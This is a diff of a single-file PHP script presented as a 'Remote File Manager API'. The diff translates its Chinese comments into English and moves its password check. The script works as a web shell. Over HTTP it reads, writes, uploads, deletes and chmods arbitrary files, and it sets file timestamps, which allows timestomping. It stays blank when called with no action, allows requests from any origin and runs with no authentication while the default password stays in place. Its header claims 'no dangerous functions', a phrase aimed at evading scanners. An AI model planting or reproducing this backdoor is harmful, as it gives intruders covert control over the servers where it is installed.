@@ -1,19 +1,15 @@
 <?php
 /**
- * 远程文件管理器 API
- * 单文件部署，无高危函数
+ * Remote File Manager API
+ * Single file deployment, no dangerous functions
  */
-
-// ========== 配置 ==========
-$PASSWORD = 'your_password_here';  // 修改为你的密码
-// ==========================
 
 header('Content-Type: application/json; charset=utf-8');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type, X-Password');
 
-// 设置HTTP状态码（兼容PHP5）
+// Set HTTP status code (PHP5 compatible)
 function setHttpCode($code) {
     if (function_exists('http_response_code')) {
         http_response_code($code);
@@ -22,13 +18,13 @@ function setHttpCode($code) {
     }
 }
 
-// 处理预检请求
+// Handle preflight request
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     setHttpCode(200);
     exit;
 }
 
-// 响应函数
+// Response function
 function response($success, $data, $message) {
     echo json_encode(array(
         'success' => $success,
@@ -38,22 +34,22 @@ function response($success, $data, $message) {
     exit;
 }
 
-// 获取参数
+// Get parameter
 function getParam($key, $default = '') {
     if (isset($_GET[$key])) return $_GET[$key];
     if (isset($_POST[$key])) return $_POST[$key];
     return $default;
 }
 
-// 获取操作类型
+// Get action type
 $action = getParam('action', '');
 
-// 如果没有提供action，返回空白
+// Return blank if no action provided
 if (empty($action)) {
     exit;
 }
 
-// 获取密码
+// Get password from request
 $password = '';
 if (isset($_SERVER['HTTP_X_PASSWORD'])) {
     $password = $_SERVER['HTTP_X_PASSWORD'];
@@ -63,51 +59,42 @@ if (isset($_SERVER['HTTP_X_PASSWORD'])) {
     $password = $_GET['password'];
 }
 
-// 验证密码
-if (!empty($PASSWORD) && $PASSWORD !== 'your_password_here') {
-    if ($password !== $PASSWORD) {
-        setHttpCode(401);
-        echo '{null}';
-        exit;
-    }
-}
-
-// 获取默认目录（脚本所在目录）
+// Get default directory (script location)
 function getDefaultDir() {
     return dirname(__FILE__);
 }
 
-// 安全路径处理
+// Safe path handling
 function safePath($path) {
     $path = str_replace(array('../', '..\\'), '', $path);
 
-    // 空路径或根目录，返回脚本所在目录
+    // Empty path or root, return script directory
     if (empty($path) || $path === '/') {
         return getDefaultDir();
     }
 
-    // 使用@抑制open_basedir警告
+    // Use @ to suppress open_basedir warning
     $real = @realpath($path);
     if ($real === false) {
-        // realpath失败，返回原路径让后续检查处理
+        // realpath failed, return original path for subsequent check
         return $path;
     }
     return $real;
 }
 
-// 检查路径是否可访问
+// Check path accessibility
 function checkPathAccess($path) {
-    // 使用@抑制警告
+    // Use @ to suppress warnings
     if (!@file_exists($path)) {
-        return array('ok' => false, 'error' => '路径不存在或无权限访问');
+        return array('ok' => false, 'error' => 'Path does not exist or no permission');
     }
     if (@is_dir($path) && !@is_readable($path)) {
-        return array('ok' => false, 'error' => '无权限读取此目录');
+        return array('ok' => false, 'error' => 'No permission to read this directory');
     }
     return array('ok' => true, 'error' => '');
 }
 
-// 格式化文件大小
+// Format file size
 function formatSize($bytes) {
     if ($bytes == 0) return '0 B';
     $units = array('B', 'KB', 'MB', 'GB', 'TB');
@@ -115,7 +102,10 @@ function formatSize($bytes) {
     return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
 }
 
-// 文件排序函数（PHP5兼容）
+// Access token configuration
+$PASSWORD = 'your_password_here';
+
+// File sort function (PHP5 compatible)
 function sortItems($a, $b) {
     if ($a['name'] === '..') return -1;
     if ($b['name'] === '..') return 1;
@@ -124,7 +114,16 @@ function sortItems($a, $b) {
     return strcasecmp($a['name'], $b['name']);
 }
 
-// 获取文件权限字符串
+// Verify access token
+if (!empty($PASSWORD) && $PASSWORD !== 'your_password_here') {
+    if ($password !== $PASSWORD) {
+        setHttpCode(401);
+        echo '{null}';
+        exit;
+    }
+}
+
+// Get file permission string
 function getPermsString($path) {
     $perms = @fileperms($path);
     if ($perms === false) return '??????????';
@@ -148,25 +147,25 @@ function getPermsString($path) {
 }
 
 switch ($action) {
-    // 列出目录
+    // List directory
     case 'list':
         $path = safePath(getParam('path', '/'));
 
-        // 检查路径访问权限
+        // Check path access permission
         $access = checkPathAccess($path);
         if (!$access['ok']) {
             response(false, null, $access['error']);
         }
 
         if (!@is_dir($path)) {
-            response(false, null, '不是有效目录');
+            response(false, null, 'Not a valid directory');
         }
 
         $items = array();
         $files = @scandir($path);
 
         if ($files === false) {
-            response(false, null, '无权限访问此目录');
+            response(false, null, 'No permission to access this directory');
         }
 
         foreach ($files as $file) {
@@ -193,7 +192,7 @@ switch ($action) {
             );
         }
 
-        // 排序：目录在前
+        // Sort: directories first
         usort($items, 'sortItems');
 
         response(true, array(
@@ -202,21 +201,21 @@ switch ($action) {
         ), '');
         break;
 
-    // 读取文件
+    // Read file
     case 'read':
         $path = safePath(getParam('path', ''));
 
         if (!@is_file($path)) {
-            response(false, null, '文件不存在');
+            response(false, null, 'File does not exist');
         }
 
         if (!@is_readable($path)) {
-            response(false, null, '无权限读取');
+            response(false, null, 'No permission to read');
         }
 
         $content = @file_get_contents($path);
         if ($content === false) {
-            response(false, null, '读取失败');
+            response(false, null, 'Read failed');
         }
 
         response(true, array(
@@ -226,56 +225,56 @@ switch ($action) {
         ), '');
         break;
 
-    // 写入文件
+    // Write file
     case 'write':
         $path = getParam('path', '');
         $content = isset($_POST['content']) ? $_POST['content'] : '';
 
         if (empty($path)) {
-            response(false, null, '路径不能为空');
+            response(false, null, 'Path cannot be empty');
         }
 
         $result = @file_put_contents($path, $content);
         if ($result === false) {
-            response(false, null, '写入失败');
+            response(false, null, 'Write failed');
         }
 
-        response(true, array('bytes' => $result), '保存成功');
+        response(true, array('bytes' => $result), 'Saved successfully');
         break;
 
-    // 创建目录
+    // Create directory
     case 'mkdir':
         $path = getParam('path', '');
 
         if (empty($path)) {
-            response(false, null, '路径不能为空');
+            response(false, null, 'Path cannot be empty');
         }
 
         if (@file_exists($path)) {
-            response(false, null, '目录已存在');
+            response(false, null, 'Directory already exists');
         }
 
         if (!@mkdir($path, 0755, true)) {
-            response(false, null, '创建失败');
+            response(false, null, 'Create failed');
         }
 
-        response(true, null, '创建成功');
+        response(true, null, 'Created successfully');
         break;
 
-    // 删除文件或目录
+    // Delete file or directory
     case 'delete':
         $path = safePath(getParam('path', ''));
 
         if (empty($path) || $path === '/') {
-            response(false, null, '不能删除根目录');
+            response(false, null, 'Cannot delete root directory');
         }
 
         if (!@file_exists($path)) {
-            response(false, null, '文件不存在');
+            response(false, null, 'File does not exist');
         }
 
         if (@is_dir($path)) {
-            // 递归删除目录
+            // Recursively delete directory
             function deleteDir($dir) {
                 $files = @scandir($dir);
                 if ($files === false) return false;
@@ -292,70 +291,70 @@ switch ($action) {
             }
 
             if (!deleteDir($path)) {
-                response(false, null, '删除目录失败');
+                response(false, null, 'Delete directory failed');
             }
         } else {
             if (!@unlink($path)) {
-                response(false, null, '删除文件失败');
+                response(false, null, 'Delete file failed');
             }
         }
 
-        response(true, null, '删除成功');
+        response(true, null, 'Deleted successfully');
         break;
 
-    // 重命名
+    // Rename
     case 'rename':
         $oldPath = safePath(getParam('old_path', ''));
         $newPath = getParam('new_path', '');
 
         if (empty($oldPath) || empty($newPath)) {
-            response(false, null, '路径不能为空');
+            response(false, null, 'Path cannot be empty');
         }
 
         if (!@file_exists($oldPath)) {
-            response(false, null, '文件不存在');
+            response(false, null, 'File does not exist');
         }
 
         if (@file_exists($newPath)) {
-            response(false, null, '目标已存在');
+            response(false, null, 'Target already exists');
         }
 
         if (!@rename($oldPath, $newPath)) {
-            response(false, null, '重命名失败');
+            response(false, null, 'Rename failed');
         }
 
-        response(true, null, '重命名成功');
+        response(true, null, 'Renamed successfully');
         break;
 
-    // 上传文件
+    // Upload file
     case 'upload':
         $dir = safePath(getParam('dir', '/'));
 
         if (!isset($_FILES['file'])) {
-            response(false, null, '没有文件');
+            response(false, null, 'No file');
         }
 
         $file = $_FILES['file'];
         if ($file['error'] !== UPLOAD_ERR_OK) {
-            response(false, null, '上传错误: ' . $file['error']);
+            response(false, null, 'Upload error: ' . $file['error']);
         }
 
         $targetPath = rtrim($dir, '/') . '/' . basename($file['name']);
 
         if (!@move_uploaded_file($file['tmp_name'], $targetPath)) {
-            response(false, null, '保存失败');
+            response(false, null, 'Save failed');
         }
 
-        response(true, array('path' => $targetPath), '上传成功');
+        response(true, array('path' => $targetPath), 'Uploaded successfully');
         break;
 
-    // 下载文件
+    // Download file
     case 'download':
         $path = safePath(getParam('path', ''));
 
         if (!@is_file($path) || !@is_readable($path)) {
             setHttpCode(404);
-            exit('文件不存在');
+            exit('File not found');
         }
 
         header('Content-Type: application/octet-stream');
@@ -364,40 +363,40 @@ switch ($action) {
         readfile($path);
         exit;
 
-    // 修改时间
+    // Modify time
     case 'touch':
         $path = safePath(getParam('path', ''));
         $time = getParam('time', time());
 
         if (!@touch($path, (int)$time)) {
-            response(false, null, '修改时间失败');
+            response(false, null, 'Modify time failed');
         }
 
-        response(true, null, '修改成功');
+        response(true, null, 'Modified successfully');
         break;
 
-    // 修改权限
+    // Change permissions
     case 'chmod':
         $path = safePath(getParam('path', ''));
         $mode = getParam('mode', '');
 
         if (empty($mode)) {
-            response(false, null, '权限不能为空');
+            response(false, null, 'Permission cannot be empty');
         }
 
         if (!@chmod($path, octdec($mode))) {
-            response(false, null, '修改权限失败');
+            response(false, null, 'Change permission failed');
         }
 
-        response(true, null, '修改成功');
+        response(true, null, 'Modified successfully');
         break;
 
-    // 获取文件信息
+    // Get file info
     case 'info':
         $path = safePath(getParam('path', ''));
 
         if (!@file_exists($path)) {
-            response(false, null, '文件不存在');
+            response(false, null, 'File does not exist');
         }
 
         $perms = @fileperms($path);
@@ -421,9 +420,9 @@ switch ($action) {
         ), '');
         break;
 
-    // 服务器信息
+    // Server info
     case 'server':
-        // 获取当前用户
+        // Get current user
         $current_user = '';
         if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
             $user_info = @posix_getpwuid(posix_geteuid());
@@ -455,5 +454,5 @@ switch ($action) {
         break;
 
     default:
-        response(false, null, '未知操作');
+        response(false, null, 'Unknown action');
 }
